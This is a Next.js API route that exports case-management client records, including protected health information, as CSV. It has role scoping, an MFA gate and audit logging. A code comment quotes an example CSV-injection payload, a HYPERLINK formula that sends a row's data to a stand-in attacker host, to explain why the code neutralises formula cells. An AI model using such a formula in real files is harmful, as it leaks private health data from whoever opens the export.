import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@/lib/supabase/server'
import { isAzureConfigured, withRlsContext } from '@/lib/db/azure'
import { auditLog } from '@/lib/audit'
import { sanitizeSearchParam } from '@/lib/validation'
import { businessTodayStr, businessDateOffsetStr } from '@/lib/business-date'
import {
  SAFE_EXPORT_SELECT,
  SAFE_EXPORT_HEADERS,
  safeRowToCSV,
  PHI_EXPORT_SELECT,
  PHI_EXPORT_HEADERS,
  phiRowToCSV,
} from '@/lib/export-columns'

/**
 * GET /api/reports/export
 * Server-side CSV export with audit trail.
 * Query params: filter, assignedTo, search, format (csv), includePhi (true)
 *
 * By default, exports are de-identified (no names, no client_id, no eligibility_code).
 * Supervisors / IT can pass ?includePhi=true to get the full dataset.
 */
export async function GET(req: NextRequest) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const { data: profile } = await supabase
    .from('profiles')
    .select('role, id')
    .eq('id', user.id)
    .single()

  if (!profile) {
    return NextResponse.json({ error: 'No profile found' }, { status: 403 })
  }

  const { searchParams } = new URL(req.url)
  const filter = searchParams.get('filter') ?? 'all'
  const assignedTo = searchParams.get('assignedTo')
  const search = searchParams.get('search')
  const includePhi = searchParams.get('includePhi') === 'true'

  // PHI exports are supervisor/IT only
  const canSeePhi =
    includePhi && ['supervisor', 'it', 'administrator'].includes(profile.role ?? '')

  // M1: PHI exports require MFA to be enabled (HIPAA defense-in-depth)
  if (canSeePhi) {
    const { data: mfaProfile } = await supabase
      .from('profiles')
      .select('mfa_email_enabled')
      .eq('id', user.id)
      .single()

    const { data: factors } = await supabase.auth.mfa.listFactors()
    const totpFactors = (factors as any)?.totp ?? (factors as any)?.all?.filter((f: any) => f.factor_type === 'totp') ?? []
    const hasVerifiedTotp = Array.isArray(totpFactors) && totpFactors.some((f: any) => f.status === 'verified')
    const hasMfa = mfaProfile?.mfa_email_enabled === true || hasVerifiedTotp

    if (!hasMfa) {
      return NextResponse.json(
        { error: 'PHI exports require multi-factor authentication. Please enable MFA in Settings → Security before downloading identifiable data.' },
        { status: 403 }
      )
    }
  }

  let clients: any[] = []
  if (isAzureConfigured()) {
    const today = businessTodayStr()
    const weekFromNow = businessDateOffsetStr(7)
    const sevenDaysAgo = businessDateOffsetStr(-7)
    try {
      clients = await withRlsContext(user.id, async (sql) => {
        const cols = canSeePhi
          ? sql`c.id, c.client_id, c.first_name, c.last_name, c.category, c.eligibility_code, c.eligibility_end_date, c.assigned_to, c.last_contact_date, c.last_contact_type, c.goal_pct, c.pos_status, c.assessment_due, c.spm_next_due, c.three_month_visit_due, c.quarterly_waiver_date, c.med_tech_redet_date, c.pos_deadline, c.thirty_day_letter_date, c.co_financial_redet_date, c.co_app_date, c.mfp_consent_date, c.two57_date, c.doc_mdh_date, c.loc_date, c.drop_in_visit_date, c.is_active, c.client_classification`
          : sql`c.id, c.category, c.eligibility_end_date, c.assigned_to, c.last_contact_date, c.last_contact_type, c.goal_pct, c.pos_status, c.assessment_due, c.spm_next_due, c.three_month_visit_due, c.quarterly_waiver_date, c.med_tech_redet_date, c.pos_deadline, c.thirty_day_letter_date, c.co_financial_redet_date, c.co_app_date, c.mfp_consent_date, c.two57_date, c.doc_mdh_date, c.loc_date, c.drop_in_visit_date, c.is_active, c.client_classification`
        let scope = sql``
        if (profile.role === 'supports_planner') {
          scope = sql`AND c.assigned_to = ${user.id}`
        } else if (profile.role === 'team_manager') {
          scope = sql`AND (c.assigned_to = ${user.id} OR c.assigned_to IN (SELECT id FROM profiles WHERE team_manager_id = ${user.id}))`
        }
        let assignedFrag = sql``
        if (assignedTo) {
          assignedFrag = sql`AND c.assigned_to = ${assignedTo}`
        }
        let searchFrag = sql``
        if (search && canSeePhi) {
          const ss = sanitizeSearchParam(search)
          if (ss) {
            const pat = `%${ss}%`
            searchFrag = sql`AND (c.last_name ILIKE ${pat} OR c.first_name ILIKE ${pat} OR c.client_id ILIKE ${pat})`
          }
        } else if (search) {
          const ss = sanitizeSearchParam(search)
          if (ss) {
            const pat = `%${ss}%`
            searchFrag = sql`AND c.category ILIKE ${pat}`
          }
        }
        let filt = sql``
        if (filter === 'overdue') {
          filt = sql`AND (c.eligibility_end_date < ${today} OR c.three_month_visit_due < ${today} OR c.quarterly_waiver_date < ${today} OR c.med_tech_redet_date < ${today} OR c.pos_deadline < ${today} OR c.assessment_due < ${today} OR c.thirty_day_letter_date < ${today} OR c.co_financial_redet_date < ${today} OR c.co_app_date < ${today} OR c.mfp_consent_date < ${today} OR c.two57_date < ${today} OR c.doc_mdh_date < ${today} OR c.spm_next_due < ${today})`
        } else if (filter === 'due_this_week') {
          filt = sql`AND ((c.eligibility_end_date >= ${today} AND c.eligibility_end_date <= ${weekFromNow}) OR (c.three_month_visit_due >= ${today} AND c.three_month_visit_due <= ${weekFromNow}) OR (c.quarterly_waiver_date >= ${today} AND c.quarterly_waiver_date <= ${weekFromNow}) OR (c.med_tech_redet_date >= ${today} AND c.med_tech_redet_date <= ${weekFromNow}) OR (c.pos_deadline >= ${today} AND c.pos_deadline <= ${weekFromNow}) OR (c.assessment_due >= ${today} AND c.assessment_due <= ${weekFromNow}) OR (c.thirty_day_letter_date >= ${today} AND c.thirty_day_letter_date <= ${weekFromNow}) OR (c.co_financial_redet_date >= ${today} AND c.co_financial_redet_date <= ${weekFromNow}) OR (c.co_app_date >= ${today} AND c.co_app_date <= ${weekFromNow}) OR (c.mfp_consent_date >= ${today} AND c.mfp_consent_date <= ${weekFromNow}) OR (c.two57_date >= ${today} AND c.two57_date <= ${weekFromNow}) OR (c.doc_mdh_date >= ${today} AND c.doc_mdh_date <= ${weekFromNow}) OR (c.spm_next_due >= ${today} AND c.spm_next_due <= ${weekFromNow}))`
        } else if (filter === 'no_contact_7') {
          filt = sql`AND (c.last_contact_date IS NULL OR c.last_contact_date < ${sevenDaysAgo})`
        }
        const rows = await sql`
          SELECT ${cols}, p.full_name AS p_full_name
          FROM clients c
          LEFT JOIN profiles p ON p.id = c.assigned_to
          WHERE c.is_active = true AND c.client_classification = 'real' ${scope} ${assignedFrag} ${searchFrag} ${filt}
          ORDER BY c.category ASC
        `
        return (rows as unknown as Array<Record<string, any>>).map((r) => ({ ...r, profiles: { full_name: r.p_full_name } }))
      })
    } catch (e: any) {
      console.error('[reports/export] DB error:', e?.message)
      return NextResponse.json({ error: 'Export failed' }, { status: 500 })
    }
  } else {
    const { createClient: createServiceClient } = await import('@supabase/supabase-js')
    const serviceSupabase = createServiceClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.SUPABASE_SERVICE_ROLE_KEY!
    )

    const selectString = canSeePhi ? PHI_EXPORT_SELECT : SAFE_EXPORT_SELECT

    let query = serviceSupabase
      .from('clients')
      .select(selectString)
      .eq('is_active', true)
      .eq('client_classification', 'real')
      .order('category', { ascending: true })

    // Role-based scoping
    if (profile.role === 'supports_planner') {
      query = query.eq('assigned_to', user.id)
    } else if (profile.role === 'team_manager') {
      const { data: planners } = await serviceSupabase
        .from('profiles')
        .select('id')
        .eq('team_manager_id', user.id)
      const plannerIds = planners?.map(p => p.id) ?? []
      plannerIds.push(user.id)
      query = query.in('assigned_to', plannerIds)
    }

    if (assignedTo) {
      query = query.eq('assigned_to', assignedTo)
    }

    if (search && canSeePhi) {
      const s = sanitizeSearchParam(search)
      if (s) query = query.or(`last_name.ilike.%${s}%,first_name.ilike.%${s}%,client_id.ilike.%${s}%`)
    } else if (search) {
      const s = sanitizeSearchParam(search)
      if (s) query = query.ilike('category', `%${s}%`)
    }

    const today = businessTodayStr()
    const weekFromNow = businessDateOffsetStr(7)
    const sevenDaysAgo = businessDateOffsetStr(-7)

    // Must match the 13 deadline fields in lib/types.ts isOverdue/isDueThisWeek.
    // Fix 2026-05-22: spm_next_due was missing — caused export filter counts
    // to disagree with dashboard counts. See AUDIT_2026-05-22.md §5A.
    const deadlineFields = [
      'eligibility_end_date', 'three_month_visit_due', 'quarterly_waiver_date',
      'med_tech_redet_date', 'pos_deadline', 'assessment_due', 'thirty_day_letter_date',
      'co_financial_redet_date', 'co_app_date', 'mfp_consent_date', 'two57_date',
      'doc_mdh_date', 'spm_next_due',
    ]

    if (filter === 'overdue') {
      query = query.or(deadlineFields.map(f => `${f}.lt.${today}`).join(','))
    } else if (filter === 'due_this_week') {
      query = query.or(deadlineFields.map(f => `and(${f}.gte.${today},${f}.lte.${weekFromNow})`).join(','))
    } else if (filter === 'no_contact_7') {
      query = query.or(`last_contact_date.is.null,last_contact_date.lt.${sevenDaysAgo}`)
    }

    const { data: clientsData, error } = await query

    if (error) {
      console.error('[reports/export] DB error:', error.message)
      return NextResponse.json({ error: 'Export failed' }, { status: 500 })
    }
    clients = clientsData ?? []
  }

  const rows = clients ?? []

  const headers = canSeePhi ? PHI_EXPORT_HEADERS : SAFE_EXPORT_HEADERS
  const rowMapper = canSeePhi ? phiRowToCSV : safeRowToCSV

  /**
   * CSV-injection-safe cell encoder.
   *
   * Excel/Sheets/LibreOffice treat cells starting with `= + - @ \t \r` as
   * formulas. A PHI export that includes a client name like
   *   =HYPERLINK("http://attacker/?p="&A1,"click")
   * would exfiltrate the row when the CSV is opened. Prefix the cell with
   * an apostrophe to neutralize the formula and keep the visible value
   * intact, then quote/escape as normal RFC-4180 CSV.
   *
   * Fix 2026-05-22: previously cells were only quote-escaped. See
   * AUDIT_2026-05-22.md §5A finding P1-6.
   */
  const FORMULA_PREFIX = /^[=+\-@\t\r]/
  function csvCell(raw: unknown): string {
    let s = String(raw ?? '')
    if (FORMULA_PREFIX.test(s)) s = "'" + s
    return `"${s.replace(/"/g, '""')}"`
  }

  const csvRows = [headers.map(csvCell).join(',')]
  for (const c of rows) {
    csvRows.push(rowMapper(c).map(csvCell).join(','))
  }

  const csv = csvRows.join('\n')

  // Audit trail
  const auditType = canSeePhi ? 'clients_csv_phi' : 'clients_csv'
  const auditParams = { filter, assignedTo, search, includePhi: canSeePhi }
  if (isAzureConfigured()) {
    await withRlsContext(user.id, (sql) => sql`INSERT INTO audit_exports (user_id, export_type, filter_params, row_count) VALUES (${user.id}, ${auditType}, ${sql.json(auditParams)}, ${rows.length})`).catch(() => {})
  } else {
    const { createClient: createAuditClient } = await import('@supabase/supabase-js')
    const auditClient = createAuditClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.SUPABASE_SERVICE_ROLE_KEY!
    )
    await auditClient.from('audit_exports').insert({
      user_id: user.id,
      export_type: auditType,
      filter_params: auditParams,
      row_count: rows.length,
    })
  }

  // Audit: log CSV export
  await auditLog(req, { userId: user.id, userEmail: user.email ?? undefined, userRole: profile?.role, action: 'report.export', resourceType: 'clients', details: { row_count: rows.length, format: 'csv' } }).catch(() => {})

  const label = canSeePhi ? 'phi' : 'safe'
  const filename = `casesync-export-${filter}-${label}-${new Date().toISOString().split('T')[0]}.csv`

  return new NextResponse(csv, {
    status: 200,
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="${filename}"`,
      'Cache-Control': 'no-store',
    },
  })
}
